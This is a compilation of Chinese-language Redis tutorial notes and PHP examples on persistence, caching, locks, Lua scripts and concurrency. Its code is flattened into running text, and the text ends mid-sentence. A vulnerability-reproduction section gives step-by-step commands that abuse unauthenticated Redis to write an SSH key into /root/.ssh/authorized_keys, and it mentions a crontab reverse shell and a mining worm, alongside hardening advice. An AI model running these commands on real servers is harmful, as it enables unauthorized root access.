文件采用压缩的二进制文件，当重启服务时加载数据文件，比 aof 方式更快.劣势:1.rbd 采用加密的二进制格式存储文件，由于 Redis 各个版本之间的兼容性问题也导致 rdb 由版本兼容问题导致无法再其他的 Redis 版本中使用.2. 时效性差，容易造成数据的不完整性。因为 rdb 并不是实时备份，当某个时间段 Redis 服务出现异常，内存数据丢失，这段时间的数据是无法恢复的，因此易导致数据的丢失.当遇到磁盘写满情况，可以使用如下命令来切换存储磁盘// dirName则是新的存储目录名(该方式同样适用于aof格式)config set dir dirNameAOF 持久化存储是什么录 redis 的操作日志，将 redis 执行过的命令记录下载，当我们需要数据恢复时，redis 去重新执行一次日志文件中的命令// 将no改为yes，控制aof开启与否appendonly no// 控制aof文件名称，存储的目录便是dir配置项appendfilename "appendonly.aof"// 三种备份策略(三者只需要开启以一个即可)# appendfsync always // 命令写入立即写入磁盘appendfsync everysec // 每秒实现文件的同步，写入磁盘# appendfsync no // 随机进行文件的同步,同步操作则交给操作系统来负责，通常时间是最长30s优点:多种文件写入 (fsync) 策略.数据实时保存，数据完整性强。即使丢失某些数据，制定好策略最多也是一秒内的数据丢失.可读性强，由于使用的是文本协议格式来存储的数据，可有直接查看操作的命令，同时也可以手动改写命令.缺点:文件体积过大，加载速度比 rbd 慢。由于 aof 记录的是 redis 操作的日志，一些无效的，可简化的操作也会被记录下来，造成 aof 文件过大。但该方式可以通过文件重写策略进行优化.选择 AOF 还是 RDB 进行数据的持久化1. 针对不同的情况来选择，建议使用两种方式相结合.2. 针对数据安全性、完整性要求高的采用 aof 方式.3. 针对不太重要的数据可以使用 rdb 方式.4. 对于数据进行全量备份，便于数据备份的可以采用 rdb 方式. https://learnku.com/articles/33954 文章投票123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165一个用户对一篇文章只能投一票一篇文章发布 7 天后不能再进行投票文章得分计算规则：发布时间 + 得票数 X 倍数（这里的倍数计算规则为：86400/200=432，86400 为一天的秒数，200 为一天时间对应的投票数/** * Redis In Action * 文章投票功能 * 前提条件： * 文章发表时，记录作者、发表时间、链接、标题、初始投票数 * 每获得一个投票，文章获得432分（86400/200） * 数据结构： * 文章hash -- 每篇文章key的形式如：article:92617 * 文章发表时间zset集合（time:），按时间排序 -- 每条记录的形式如：article:92617（member） 1332065417（score） * 文章得分zset集合(score:)，按分数排序 * 用户对文章的投票set集合(vote:xxxx) -- key形式如：vote:100408，item形式如：user:233487 */const ONE_WEEK_IN_SECONDS = 7 * 86400;const VOTE_SCORE = 432;const ARTICLES_PER_PAGE = 25;$redis = new Redis();$redis-&gt;connect('127.0.0.1', '6379') || exit('连接失败！');/** * 文章投票 * @param Redis $redis * @param $user * @param $article */function articleVote($redis, $user, $article)&#123; $cutoff = time() - ONE_WEEK_IN_SECONDS; //对发表时间超过一周的文章投票不生效 //获取 time: 有序集合对应 member 的 score if ($redis-&gt;zScore('time:', $article) &lt; $cutoff) &#123; return; &#125; $article_id = explode(':', $article)[1]; //无序集合，添加记录，如果记录存在，返回0（说明用户已对该文章投票），反之则计算分数 if ($redis-&gt;sAdd('voted:' . $article_id, $user)) &#123; // 使用事务操作 /*$redis-&gt;multi() -&gt;zIncrBy('score:' , VOTE_SCORE, $article) //增加文章的分数 -&gt;hIncrBy($article, 'votes', 1) //增加文章的投票数 -&gt;exec();*/ //使用pipeline型的事务 //一次性向服务端发送所有命令，减少客户端与服务端之间通讯往返次数 $pipe = $redis-&gt;multi(Redis::PIPELINE); $pipe-&gt;zIncrBy('score:', VOTE_SCORE, $article); $pipe-&gt;hIncrBy($article, 'votes', 1); $pipe-&gt;exec(); &#125;&#125;/** * 发表文章 * @param Redis $redis * @param string $user example: 'user:123456' * @param $title * @param $link * @return integer */function postArticle($redis, $user, $title, $link)&#123; $article_id = $redis-&gt;incr('article:'); //自增1，不存在key则赋值1 $voted = 'voted:' . $article_id; $redis-&gt;sAdd($voted, $user); //将作者设为已投票用户 $redis-&gt;expire($voted, ONE_WEEK_IN_SECONDS); //文章投票信息设置为一周后自动失效 $now = time(); //添加文章 $article = 'article:' . $article_id; //作为文章hash的key值 $redis-&gt;hMSet($article, [ //批量设置hash键值对 'title' =&gt; $title, 'link' =&gt; $link, 'poster' =&gt; $user, 'time' =&gt; $now, 'votes' =&gt; 1, ]); //注意zadd第二个参数为score，第三个为member $redis-&gt;zAdd('score:', $now + VOTE_SCORE, $article); //设置文章初始分数 $redis-&gt;zAdd('time:', $now, $article); //记录文章发表时间 return $article_id;&#125;/** * 获取文章列表 * @param Redis $redis * @param $page * @param string $order 用来排序的有序集合 */function getArticles($redis, $page, $order = 'score:')&#123; $start = ($page - 1) * ARTICLES_PER_PAGE; $end = $start + ARTICLES_PER_PAGE - 1; //获取指定范围内的member值（文章ID，article:123456），按$order分数递减排序 $ids = $redis-&gt;zRevRange($order, $start, $end); $pipe = $redis-&gt;multi(Redis::PIPELINE); foreach ($ids as $id) &#123; $pipe-&gt;hGetAll($id); //不使用pipeline的时候 /*$article_data = $redis-&gt;hGetAll($id); $article_data['id'] = $id; $articles[] = $article_data;*/ &#125; $articles = $pipe-&gt;exec(); //把文章ID加回去 foreach ($articles as $k =&gt; $article) &#123; $articles[$k]['id'] = $ids[$k]; &#125; return $articles;&#125;/** * 添加/移除文章分类 * @param Redis $redis * @param $article_id * @param array $to_add * @param array $to_remove */function addRemoveGroups($redis, $article_id, $to_add = [], $to_remove = [])&#123; $article = 'article:' . $article_id; foreach ($to_add as $group) &#123; $redis-&gt;sAdd('group:' . $group, $article); &#125; foreach ($to_remove as $group) &#123; $redis-&gt;sRem('group:' . $group, $article); &#125;&#125;/** * 获取分组下的文章数据 * @param Redis $redis * @param $group * @param $page * @param string $order */function getGroupArticles($redis, $group, $page, $order = 'score:')&#123; $key = $order . $group; if (!$redis-&gt;exists($key)) &#123; //获得对应分组下，文章-分数的有序集合 $redis-&gt;zInterStore($key, ['group:' . $group, $order], [1, 1], 'max'); $redis-&gt;expire($key, 60); &#125; return getArticles($redis, $page, $key);&#125;//发布若干文章postArticle($redis, 'user:1', '测试文章1', 'article-link-1');postArticle($redis, 'user:2', '测试文章2', 'article-link-2');postArticle($redis, 'user:3', '测试文章3', 'article-link-3');//用户10对文章1进行投票articleVote($redis, 'user:10', 'article:1');echo "article:1 的投票用户:" . PHP_EOL;$result = $redis-&gt;sMembers('voted:1');print_r($result);echo "各文章得分:" . PHP_EOL;$scores = $redis-&gt;zRange('score:', 0, -1, 'withscores');print_r($scores);echo "文章列表:" . PHP_EOL;$articles = getArticles($redis, 1);print_r($articles);exit();//给文章添加分类addRemoveGroups($redis, '1', ['php', 'redis']);addRemoveGroups($redis, '2', ['python', 'redis']);//获取‘redis’分组下的文章$redisGroupArticles = getGroupArticles($redis, 'redis', 1);echo "redis分类的文章列表:" . PHP_EOL;print_r($redisGroupArticles);https://github.com/HubQin/redis-in-action-php/blob/master/article_voting.phphttps://learnku.com/articles/29511 缓存穿透123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657缓存穿透 ： DB 承受了没有必要的查询流量，意思就是查到空值的时候没有做缓存处理，再次查询的时候继续读库了缓存击穿：热点 Key，大量并发读请求引起的小雪崩， 就是缓存在某个时间点过期的时候，恰好在这个时间点对这个 Key 有大量的并发请求过来，这些请求发现缓存过期一般都会从后端 DB 加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端 DB 压垮缓存雪崩：缓存设置同一过期时间，引发的大量的读取数据库操作https://www.jianshu.com/p/fef1c22d63cb（1）缓存穿透请求去查询一条压根儿数据库中根本就不存在的数据，也就是缓存和数据库都查询不到这条数据，但是请求每次都会打到数据库上面去。解决方案：1. 对于返回为 NULL 的依然缓存2. 制定一些规则过滤一些不可能存在的数据（2）缓存击穿在平常高并发的系统中，大量的请求同时查询一个 key 时，此时这个 key 正好失效了，就会导致大量的请求都打到数据库上面去。这种现象我们称为缓存击穿。解决方案：1. 加分布式锁，对于获取到这个锁的线程，查询数据库更新缓存，其他线程采取重试策略2. 采取到期自动刷新的策略，而不是到期自动淘汰（3）缓存雪崩当某一时刻发生大规模的缓存失效的情况，比如你的缓存服务宕机了，会有大量的请求进来直接打到 DB 上面。解决方案：1. 增加缓存系统可用性，通过监控关注缓存的健康程度，根据业务量适当的扩容缓存。2. 采用多级缓存，不同级别缓存设置的超时时间不同，及时某个级别缓存都过期，也有其他级别缓存兜底。3. 缓存的过期时间可以取个随机值，尽量让不同 Key 的过期时间不同。六、缓存更新策略（1）Cache Aside应用查询数据的时候先查询缓存层的数据，如果缓存中没有则到数据库中查询数据，并把数据放入缓存层。更新数据的时候先对数据库进行更新，然后通过指令使缓存层的数据失效。(2)Read/Write Through应用要读数据和更新数据都直接访问缓存服务缓存服务同步的将数据更新到数据库(3)Write Behind应用要读数据和更新数据都直接访问缓存服务缓存服务异步的将数据更新到数据库（通过异步任务）https://learnku.com/articles/29751 Redis 的 LBS 尝试地理位置12345678910111213141516171819202122232425$redis-&gt;rawCommand('geoadd', 'location', '120.118007', '30.259293', '桃园岭');$redis-&gt;rawCommand('geoadd', 'location', '120.119445','30.255082', '农耕科普园');$redis-&gt;rawCommand('geoadd', 'location', '120.071655','30.272893', '西溪湿地');$redis-&gt;rawCommand('geoadd', 'location', '120.114321','30.221218', '龙井村');$redis-&gt;rawCommand('geoadd', 'location', '120.145012','30.205586', '白塔公园');$redis-&gt;rawCommand('geoadd', 'location', '120.112912','30.224221', '十里琅珰');$redis-&gt;rawCommand('geoadd', 'location', '120.107264','30.206997', '狮峰');$redis-&gt;rawCommand('geoadd', 'location', '120.117936','30.227969', '真迹寺');$redis-&gt;rawCommand('geoadd', 'location', '120.10826','30.246569', '灵隐寺');$redis-&gt;rawCommand('geoadd', 'location', '120.114123','30.264152', '状元峰');我们获取西溪湿地和龙井村的距离$ret = $redis-&gt;rawCommand('GEODIST', 'location','西溪湿地', '龙井村', 'm');print_r($ret); //7060.0083其他命令：// 返回灵隐寺,状元峰的位置$ret = $redis-&gt;rawCommand('GEOPOS', 'location','灵隐寺', '状元峰');print_r($ret);// 返回'120.114253','30.219759'坐标附近1km的地址$ret = $redis-&gt;rawCommand('GEORADIUS', 'location','120.114253','30.219759', 1, 'km', 'WITHDIST');print_r($ret);$ret = $redis-&gt;rawCommand('GEOHASH', 'location','龙井村', '灵隐寺');print_r($ret);https://learnku.com/articles/35871 基于redis的秒杀123456789101112131415161718192021222324252627282930313233343536//实例化redis$redis = new Redis();//连接$redis-&gt;connect('127.0.0.1', 6379);$key = 'sale';//检测是否连接成功// echo "Server is running: " . $redis-&gt;ping();$redis-&gt;setnx($key, 0);$redis-&gt;watch($key); //监测一个key的值是否被更改$sale_num = $redis-&gt;get($key);if ($sale_num &gt; 4) &#123; exit();&#125;$redis-&gt;multi(); //标记事务$redis-&gt;incr($key); //销量+1sleep(1); //模拟真实环境$ret = $redis-&gt;exec(); // 事务块内所有命令的返回值，按命令执行的先后顺序排列。if ($ret) &#123; include 'db.php'; $db = new db([ 'database_type' =&gt; 'mysql', 'database_name' =&gt; 'test', 'server' =&gt; 'www.13sai.com&amp;#39;, 'username' =&gt; '13sai', 'password' =&gt; '*', 'charset' =&gt; 'utf8' ]); $db-&gt;update('goods', ["stock_num[-]" =&gt; 1], ['id' =&gt; 1]);&#125; 查看所有 key 的 value 值所占内存大小1234567891011121314151617$ pip install rdbtools python-lzf$ git clone https://github.com/sripathikrishnan/redis-rdb-tools$ cd redis-rdb-tools$ sudo python setup.py install$ whereis redis.confredis: /etc/redis.conf$ cat /etc/redis.conf | grep dir | grep redisdir /var/lib/redis$ cat /etc/redis.conf | grep dump.rdbdbfilename dump.rdb综上，得知其路径为：/var/lib/redis/dump.rdb按内存值导出 csv$ rdb -c memory /var/lib/redis/dump.rdb &gt; /tmp/redis.csvhttps://learnku.com/articles/33211 Redis 快速上手12345678910111213141516171819202122232425262728293031323334353637383940Redis 的事务处理的命令MULTI：开启一个事务；EXEC：事务执行，将一次性执行事务内的所有命令；DISCARD：取消事务；WATCH：监视一个或多个键，如果事务执行前某个键发生了改动，那么事务也会被打断；UNWATCH：取消 WATCH 命令对所有键的监视。需要说明的是 Redis 实现事务是基于 COMMAND 队列，如果 Redis 没有开启事务，那么任何的 COMMAND 都会立即执行并返回结果。如果 Redis 开启了事务，COMMAND 命令会放到队列中，并且返回排队的状态 QUEUED，只有调用 EXEC，才会执行 COMMAND 队列中的命令。玩家排行榜案例统计全部玩家的排行榜ZREVRANGE user_score 0 -1 WITHSCORES按名次查询排名前 N 名的玩家统计前 10 名玩家，可以使用：ZREVRANGE user_score 0 9查询某个玩家的分数查询玩家 10001 的分数可以使用：ZSCORE user_score 10001查询某个玩家的排名查询玩家 10001 的排名可以使用：ZREVRANK user_score 10001对玩家的分数和排名进行更新对玩家 10001 的分数减 1，可以使用：ZINCRBY user_score -1 10001查询指定玩家前后 M 名的玩家查询玩家 10001 前后 5 名玩家都是谁，当前已知玩家 10001 的排名是 18036，那么可以使用：ZREVRANGE user_score 18031 18041增加或移除某个玩家，并对排名进行更新删除玩家 10001，可以使用：ZREM user_score 10001查询下排名在 18031 到 18041 的玩家是谁，使用：ZREVRANGE user_score 18031 18041把玩家 10001 的信息再增加回来，使用：ZADD user_score 93.1504697596 10001看下排名在 18031 到 18041 的玩家是谁，使用：ZREVRANGE user_score 18031 18041https://learnku.com/articles/37066 redis安全123456789101112131415161718192021222324Redis 默认情况下，会绑定在 0.0.0.0:6379，在没有利用防火墙进行屏蔽的情况下，将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下利用 Redis 的相关方法，可以成功将自己的公钥写入目标服务器的 ~/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接登录目标服务器；如果 Redis 服务是以 root 权限启动，可以利用该问题直接获得服务器 root 权限。经过对捕获的事件进行分析，整个入侵流程大概是包含以下几个环节：扫描开放 6379 端口的 Linux 服务器（后续感染扫描网段为 1.0.0.0/16 到 224.255.0.0/16 ）通过 redis-cli 尝试连接 Redis 并执行预置在.dat 文件里的利用命令将 Redis 的数据文件修改为 /var/spool/cron/root，然后通过在 Redis 中插入数据，将下载执行脚本的动作写入 crontab 任务通过脚本实现以上的相关行为，完成植入并启动挖矿程序Redis 服务加固导致入侵的主要原因是 Redis 未授权访问问题，所以如果要扼制入侵的入口，需要针对 Redis 服务进行加固，避免黑客通过该途径进行入侵植入挖矿蠕虫。如无必要，修改 bind 项，不要将 Redis 绑定在 0.0.0.0 上，避免 Redis 服务开放在外网，可以通过 iptables 或者腾讯云用户可以通过安全组限制访问来源在不影响业务的情况，不要以 root 启动 Redis 服务，同时建议修改默认的 6379 端口，大部分针对 Redis 未授权问题的入侵都是针对默认端口进行的配置 AUTH，增加密码校验，这样即使开放在公网上，如果非弱口令的情况，黑客也无法访问 Redis 服务进行相关操作使用 rename-command CONFIG "RENAME_CONFIG"重命名相关命令，这样黑客即使在连接上未授权问题的 Redis 服务，在不知道命令的情况下只能获取相关数据，而无法进一步利用 https://www.v2ex.com/t/584369docker 的 -p 如果直接 6379:6379 是会默认绑定 0.0.0.0 的，而且还会自动打开防火墙的这个端口，不注意很容易被坑的，必须要-p 127.0.0.0:6379:6379 这样用才行Redis 也被挖矿攻击！ https://cn.v2ex.com/t/623847#reply27 // 它这个脚本保存在 value 里，怎么才能被执行到 显然 redis 公网开放，并且无认证 如果 redis 被恶意程序访问到了，那么可以利用 config set dir xxxconfig set dbfilename xxxxset xxxsave 这几条命令在 linux 目录下创建文件。 https://p0sec.net/index.php/archives/69/ Redis scard主从延时问题123456789101112131415161718192021222324252627282930313233343536373839function setPrize($arrPrizes) &#123; try &#123; // 真实的奖品是由上面的参数$arrPrizes传入，数据格式如下： // $arrPrizes = array( // array('code' =&gt; 'A0001', 'name' =&gt; 'iPhone'), // array('code' =&gt; 'A0002', 'name' =&gt; 'iPhone'), // ); foreach ($arrPrizes as $intIndex =&gt; $arrPrize) &#123; $arrPrizes[$intIndex] = json_encode($arrPrize); &#125; // 获取Redis实例 $objRedis = RedisUtil::getInstance(); $strRedisKey = 'www.daemoncoder.com'; $arrPrizePages = array_chunk($arrPrizes, 100); foreach ($arrPrizePages as $arrPrizePage) &#123; // 分批写入redis中 $intAddResult = $objRedis-&gt;sAddArray($strRedisKey, $arrPrizePage); echo sprintf("AddResult: %s\n", var_export($intAddResult, true)); &#125; // 判断写入的集合最终大小是否和传入的数组大小一致 // 不一致则中间有数据没有成功写入，需要返回给上层重试或者报警 $intScardResult = $objRedis-&gt;sCard($strRedisKey); echo sprintf("ScardResult: %s\n", var_export($intScardResult, true)); if ($intScardResult == count($arrPrizes)) &#123; return true; &#125; &#125; catch (Exception $e) &#123; var_dump($e); &#125; return false;&#125;通过sAddArray()写入集合的数据，有部分还没有生效。Redis本身用单线程处理请求，理论不应该存在出现这种延时，但是线上环境的Redis往往都是主从结构的，主库到从库同步数据是会有延时的，这也是出现这个问题的真实的原因。上述代码中用RedisUtil::getInstance()来获取redis实例，前面也有介绍，这个是我们自己封装的Redis工具类，会根据不同的redis命令做读写分离。sAddArray()是一个写请求，会自动选择主库连接执行，而sCard()是一个读请求，默认会选择从库去执行。所以会出现用sCard()读取不到集合真实的大小，因为从库此时可能还没有同步到最新的数据。解决方案调整代码，强制让sCard()方法选择主库（每个人连接的Redis工具类不同，这里不再贴代码，大概的方式就是连接时指定主库的IP）。这样经过多次反复测试，没有再出现这个问题。https://www.daemoncoder.com/a/%E8%AE%B0%E4%B8%80%E6%AC%A1Redis%20scard%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%9C%E4%B8%8D%E5%AF%B9%E7%9A%84%E9%97%AE%E9%A2%98/4d54673d?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io redis数据持久化123456789101112131415161718192021222324edis作为内存数据库，一共支持2种数据持久化方案：RDB、AOF。这两种方案把数据存储到磁盘中，既可以同时使用，也可以单独使用，甚至都不使用，具体使用可以配置。把数据存储到磁盘主要是为了以后重用数据，或者防止系统出现故障而将数据备份到远程位置。rdb的主要原理是在某个时间点，把内存中所有的数据做一份快照，然后把快照中的数据保存在磁盘中。save 900 1 #900秒时间，至少有一条数据更新，则保存到数据文件中save 300 10 #300秒时间，至少有10条数据更新，则保存到数据文件中save 60 10000 #60秒时间，至少有10000条数据更新，则保存到数据文件中stop-writes-on-bgsave-error yesrdbcompression yes 指定存储至本地数据库时是否压缩数据，默认是yes，redis采用LZF压缩，如果为了节省CPU时间可以关闭该选项，但会导致数据库文件扁的巨大rdbchecksum yes 对rdb文件进行校验dbfilename "dump.rdb"dir "XXX"当redis的bgsave命令触发时：会fork一个新进程，在新进程中进行处理快照的操作，主进程依旧可以执行别的请求。aof持久化是将被执行的写命令，写到aof文件的末尾，以此来记录数据的变化。appendonly no #是否开启aof。默认是关闭的# appendfsync always # always：表示每次redis写操作都会同步写入磁盘，这样会严重降低redis速度。appendfsync everysec # everysec：表示每秒同步一次（折衷，默认值），通过redis的时间事件# appendfsync no # no：表示redis不主动同步aof数据。等操作系统进行数据缓存同步到磁盘(快)其实redis的bgrewriteaof命令跟bgsave命令非常相似。都是创建一个子进程，把当前的数据创建一份快照，由子进程进行保存，然后替代以前的aof文件（并不是追加都文件末尾）。比较关心数据，但是可以忍受几分钟数据的丢失，可以使用rdb；不建议只使用aof：因为rdb文件是恢复数据、复制数据的最好的办法；如果对数据要求特别高，可以同时使用两种方案；https://bettercuicui.github.io/2018/04/01/REDIS/redis%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96_RDB_AOF/ 基于redis实现分布式锁123456789101112131415161718192021222324252627$ret = $this-&gt;getCon()-&gt;setnx($key,1);if(1 == $ret)&#123; do something... $this-&gt;getCon()-&gt;del($key);&#125;$this-&gt;getCon()-&gt;multi();$this-&gt;getCon()-&gt;setnx($key,1);$this-&gt;getCon()-&gt;EXPIRE($key,$time);$this-&gt;getCon()-&gt;exec();$ret = $this-&gt;getCon()-&gt;set($key,1,array('nx','ex'=&gt;self::EXP_TIME));if(1 == $ret)&#123; do something... $this-&gt;getCon()-&gt;del($key);&#125;$ret = $this-&gt;getCon()-&gt;set($key,$random,array('nx','ex'=&gt;self::EXP_TIME));if(1 == $ret)&#123; do something... if($random == $this-&gt;getCon()-&gt;get($key))&#123; $this-&gt;getCon()-&gt;del($key); &#125;&#125;if redis.call("get",KEYS[1]) == ARGV[1] then return redis.call("del",KEYS[1])else return 0endhttps://bettercuicui.github.io/2018/04/01/REDIS/%E5%9F%BA%E4%BA%8Eredis%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/ Redis 使用 lua 脚本12345678910111213141516171819减少网络开销，一个脚本包含多个命令原子操作， redis 是单线程的，Redis 的 API 是原子性的操作，所以一个脚本在 Redis 里面是作为一个整体执行，中途不会被插入其他操作，脚本本身就是事务，更简单，速度更快可复用，客户端发送的脚步会永久存在 redis 中，这样，其他客户端可以复用这一脚本而不需要使用代码完成相同的逻辑# KEYS和ARGV中间的 ',' 两边的空格，不能省略。 Redis-cli -h address -p port --eval path/to/redis.lua KEYS[1] KEYS[2] , ARGV[1] ARGV[2] $redisHost = '127.0.0.1';$redisPort = 6379;//实例化redis类$redis = new Redis();$redis-&gt;connect($redisHost, $redisPort);$lua = &lt;&lt;&lt;SCRIPT return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;SCRIPT;//对应的redis命令如下 eval "return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;" 2 key1 key2 first second//2表示KEYS的值为前2个，剩下的参数为ARGV$s = $redis-&gt;eval($lua,array('key1','key2','first','second'),2);var_dump($s);https://learnku.com/articles/37766 redis未授权&amp;弱密码漏洞复现和防护12345678910111213141516171819202122232425262728293031323334353637383940vi /etc/redis/redis.conf，注释掉bind 127.0.0.1 ::1即让redis监听所有网段$ redis-cli -h 192.168.99.100192.168.99.100:6379&gt; info写ssh公钥实现远程登陆首先生产密钥对： ssh-keygen -t rsa将公钥制作成上传文件： (echo -e "\n\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n\n") &gt; upload.txt将上传文件保存在redis-cli的临时变量中： cat ~/upload.txt | redis-cli -h 192.168.99.100 -x set tmp连接redis，将tmp变量的内容写入/root/.ssh/authorized_keys: redis-cli -h 192.168.99.100config set dir /root/.sshconfig set dbfilename authorized_keysget tmpsave接着使用私钥即可登陆靶机： ssh -i ~/.ssh/id_rsa root@192.168.99.100写crontab文件反弹shellcrontab跟ssh差不多，但是笔者再ubuntu18.04中复现失败，原因是写入的crontab文件存在redis的一些字符，导致格式不正确使用apt install redis-server的方式安装，并且使用service redis start启动redis，这样redis会在一个低权限用户下运行[root@VM_0_11_centos ~]# ps -ef |grep redisredis 2538 1 0 Nov14 ? 00:25:57 /usr/bin/redis-server 127.0.0.1:6379root 16915 8467 0 11:06 pts/0 00:00:00 grep --color=auto redis若必须以root身份运行，为redis设置一定强度的密码（实际复现中我们可以发现，新版redis在以root运行，不设置密码的情况下会启动保护模式，只允许本地cli）定时检查redis日志cat /etc/redis.conf |grep logfilelogfile /var/log/redis/redis.log[root@VM_0_11_centos ~]# more /var/log/redis/redis.loghttps://anemone.top/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/ 删除大key123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596vendor/predis/predis/src/Collection/Iterator/Keyspace.php:22laravel predis https://github.com/nrk/predis/blob/v1.0/examples/redis_collections_iterators.phpfor ($i = 0; $i &lt; 5; ++$i) &#123; $client-&gt;sadd('predis:set', "member:$i"); $client-&gt;zadd('predis:zset', -$i, "member:$i"); $client-&gt;hset('predis:hash', "field:$i", "value:$i");&#125;// === Keyspace iterator based on SCAN ===echo 'Scan the keyspace matching only our prefixed keys:', PHP_EOL;foreach (new Iterator\Keyspace($client, 'predis:*') as $key) &#123; echo " - $key", PHP_EOL;$client-&gt;del($key);&#125;/* OUTPUTScan the keyspace matching only our prefixed keys: - predis:zset - predis:set - predis:hash*/function scanAllForMatch ($pattern, $cursor=null, $allResults=array()) &#123; // Zero means full iteration if ($cursor==="0") &#123; return $allResults; &#125; // No $cursor means init if ($cursor===null) &#123; $cursor = "0"; &#125; // The call $result = Redis::scan($cursor, 'match', $pattern); // Append results to array $allResults = array_merge($allResults, $result[1]); // Recursive call until cursor is 0 return scanAllForMatch($pattern, $result[0], $allResults);&#125;$allResults = scanAllForMatch('*keypattern*');https://stackoverflow.com/questions/35477172/laravel-and-redis-scan$redis-&gt;pconnect($redisConf[0], $redisConf[1], $timeout); //默认SCAN_NORETRY情况下有可能会返回空数组，设置成SCAN_RETRY，如果是空数组的话，将不返回继续扫描下去 $redis-&gt;setOption(\Redis::OPT_SCAN, \Redis::SCAN_RETRY); $it = NULL; while ($arr_keys = $redis-&gt;scan($it, CacheKeyConfig::CachePre.'*')) &#123; if (is_array($arr_keys)) &#123; //推荐使用unlink函数，非阻塞删除，删除大key时很好用，但是它需要redis版本&gt;=4.0 $result = $redis-&gt;del($arr_keys); echo $result . PHP_EOL; &#125; &#125; 链接：https://juejin.im/post/5cf4e52e6fb9a07ecd3d46fe $it = NULL; while($arr_keys = $redis-&gt;scan($it, "mykey:*", 10000)) &#123; foreach($arr_keys as $str_key) &#123; echo "Here is a key: $str_key\n"; &#125; &#125; $pattern_arr=[]; $pattern_arr['COUNT'] = 10; $cursor = null;$i=0; while($cursor !== 0)&#123; // 命令位置 vendor\predis\predis\src\Command\HashScan.php $info = $redis-&gt;hscan('news:all', $cursor, $pattern_arr); $cursor = intval($info[0]);dump(count($info[1])); $list = $info[1] ?$info[1]: [];$i++; if($list)&#123; $del_field = []; foreach($list as $field=&gt;$v)&#123; $del_field[] = $field; &#125; dump(count($del_field),$i); $redis-&gt;hdel('news:all', $del_field); if ($i &gt; 100) &#123; break; &#125; &#125; &#125; $cursor = 0;$i=0; do &#123; // $arr_keys = $redis-&gt;scan($it, 'app:read:news:uuid:*', $pattern_arr); $arr_keys = $redis-&gt;scan($cursor, 'match', 'app:read:news:uuid:*');dump($arr_keys); if (is_array($arr_keys) &amp;&amp; !empty($arr_keys)) &#123; foreach ($arr_keys as $str_key) &#123; dump($str_key); &#125; &#125; &#125; while ($arr_keys !== false); http://doc.redisfans.com/key/scan.html redis中的并发问题12345678910111213141516171819202122232425262728require "vendor/autoload.php";//https://www.cnblogs.com/iforever/p/5796902.html$client = new Predis\Client([ 'scheme' =&gt; 'tcp', 'host' =&gt; '127.0.0.1', 'port' =&gt; 6379,]);for ($i = 0; $i &lt; 1000; $i++) &#123; $num = intval($client-&gt;get("name")); $num = $num + 1; $client-&gt;setex("name", $num, 10080); usleep(10000);&#125;设置name初始值为0，然后同时用两个终端执行上面的程序，最后name的值可能不是2000，而是一个&lt;2000的值，这也就证明了我们上面的并发问题的存在redis中命令是满足原子性的，因此在值为阿拉伯数字的时候，我可以将get和set命令修改为incr或者incrbyfor ($i = 0; $i &lt; 1000; $i++) &#123; $client-&gt;incr("name"); $client-&gt;expire("name", 10800); usleep(10000);&#125;非数字那只能用watch、multi、exec了1）setnx(lockkey, 当前时间+过期超时时间) ，如果返回1，则获取锁成功；如果返回0则没有获取到锁，转向2。2.）get(lockkey)获取值oldExpireTime ，并将这个value值与当前的系统时间进行比较，如果小于当前系统时间，则认为这个锁已经超时，可以允许别的请求重新获取，转向3。3.）计算newExpireTime=当前时间+过期超时时间，然后getset(lockkey, newExpireTime) 会返回当前lockkey的值currentExpireTime。4.）判断currentExpireTime与oldExpireTime 是否相等，如果相等，说明当前getset设置成功，获取到了锁。如果不相等，说明这个锁又被别的请求获取走了，那么当前请求可以直接返回失败，或者继续重试。5） 在获取到锁之后，当前线程可以开始做自增操作，当处理完毕后，比较自己的处理时间和对于锁设置的超时时间，如果小于锁设置的超时时间，则直接执行delete释放锁；如果大于锁设置的超时时间，则不需要再锁进行处理 Redis 使用 Lua 脚本替代 SETNX / DECR 保证原子性1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980 /** * TRUE: 触发限流，FALSE：未触发限流 */ public function acquire() &#123; try &#123; $redisHandler = $this-&gt;redisInstance-&gt;getHandler(); $redisHandler-&gt;set($this-&gt;rateLimitKey, $this-&gt;tokenNum, ['nx', 'ex' =&gt; $this-&gt;expireTime]); $leftTokenNum = $redisHandler-&gt;decr($this-&gt;rateLimitKey); if ($leftTokenNum &lt; 0) &#123; return TRUE; &#125; return FALSE; &#125; catch (\Exception $e) &#123; return FALSE; &#125; &#125; 使用 redis 来起到一个限流的作用，1 秒钟只允许 1 人购买 $redis-&gt;set('key', '1', ['nx', 'ex'=&gt;1]); 命令，设置值为 1 过期时间为 1 秒的计数器，基于该计数器的扣减来达到 1 秒钟放行 1 个请求的目的。 $key = 'test_redis_key'; $redis-&gt;set($key, '1', ['nx', 'ex' =&gt; 1]); $left = $redis-&gt;decr($key); if ($left &lt; 0) &#123; // 这里通过状态码来更方便的观察 header('Is-Limited:1', true, 500); &#125; else &#123; header('Is-Limited:0', true, 200); &#125; 在 Redis key 未过期之前，DECR 命令都是正常扣减的。一旦 